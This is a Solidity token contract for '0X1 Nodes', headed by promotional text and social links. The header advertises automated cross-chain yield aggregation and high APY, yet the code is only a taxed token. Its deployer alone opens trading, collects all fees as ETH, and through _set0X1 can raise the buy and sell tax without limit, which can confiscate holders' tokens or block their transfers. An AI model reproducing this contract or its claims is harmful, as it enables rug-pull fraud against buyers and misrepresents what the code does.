/*

Introducing $0X1: Automated Cross-chain Yield Aggregation!

0x1 Nodes was founded to allow anyone to easily generate high APY returns, across any chain (even one they do not own any assets on), with minimal to no gas fees.

You choose how involved you want to be in your investments. Actively manage your funds, making use of our seamless, cross-chain bridging to maximise your options, or set and forget by choosing a strategy curated by our team and we take care of the rest. We hunt down the high APYs, you harvest the yield.

</> 10.000.000 $0X1
</> 3/3 Tax

Telegram: https://t.me/Zerox1Nodes
Twitter: https://twitter.com/0x1Nodes
Website: https://0x1nodes.space
Medium: https://medium.com/@0x1nodes

*/
// SPDX-License-Identifier: unlicense

pragma solidity ^0.8.20;

    interface IUniswapV2Router02 {
        function swapExactTokensForETHSupportingFeeOnTransferTokens(
            uint amountIn,
            uint amountOutMin,
            address[] calldata path,
            address to,
            uint deadline
            ) external;
        }
        
    contract Zerox1Nodes {
        string public constant name = "0X1 Nodes";  //
        string public constant symbol = "0X1";  //
        uint8 public constant decimals = 18;
        uint256 public constant totalSupply = 10_000_000 * 10**decimals;

        uint256 BurnFigure = 3;
        uint256 ConfirmFigure = 3;
        uint256 constant swapAmount = totalSupply / 100;

        mapping (address => uint256) public balanceOf;
        mapping (address => mapping (address => uint256)) public allowance;
            
        error Permissions();
            
        event Transfer(address indexed from, address indexed to, uint256 value);
        event Approval(
            address indexed owner,
            address indexed spender,
            uint256 value
        );
            

        address private pair;
        address constant ETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
        address constant routerAddress = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
        IUniswapV2Router02 constant _uniswapV2Router = IUniswapV2Router02(routerAddress);
        address payable constant deployer = payable(address(0x783134BA47b217f73b9C64bDdc714c2BE79fFA3d)); //

        bool private swapping;
        bool private tradingOpenNow;

        constructor() {
            balanceOf[msg.sender] = totalSupply;
            allowance[address(this)][routerAddress] = type(uint256).max;
            emit Transfer(address(0), msg.sender, totalSupply);
        }

         receive() external payable {}

        function approve(address spender, uint256 amount) external returns (bool){
            allowance[msg.sender][spender] = amount;
            emit Approval(msg.sender, spender, amount);
            return true;
        }

        function transfer(address to, uint256 amount) external returns (bool){
            return _transfer(msg.sender, to, amount);
        }

        function transferFrom(address from, address to, uint256 amount) external returns (bool){
            allowance[from][msg.sender] -= amount;        
            return _transfer(from, to, amount);
        }

        function _transfer(address from, address to, uint256 amount) internal returns (bool){
            require(tradingOpenNow || from == deployer || to == deployer);

            if(!tradingOpenNow && pair == address(0) && amount > 0)
                pair = to;

            balanceOf[from] -= amount;

            if (to == pair && !swapping && balanceOf[address(this)] >= swapAmount){
                swapping = true;
                address[] memory path = new  address[](2);
                path[0] = address(this);
                path[1] = ETH;
                _uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
                    swapAmount,
                    0,
                    path,
                    address(this),
                    block.timestamp
                    );
                deployer.transfer(address(this).balance);
                swapping = false;
                }

            if(from != address(this)){
                uint256 FinalFigure = amount * (from == pair ? BurnFigure : ConfirmFigure) / 100;
                amount -= FinalFigure;
                balanceOf[address(this)] += FinalFigure;
            }
                balanceOf[to] += amount;
                emit Transfer(from, to, amount);
                return true;
            }

        function NowTradingOpen() external {
            require(msg.sender == deployer);
            require(!tradingOpenNow);
            tradingOpenNow = true;        
            }

        function _set0X1(uint256 newBurn, uint256 newConfirm) external {
            require(msg.sender == deployer);
            BurnFigure = newBurn;
            ConfirmFigure = newConfirm;
            }
        }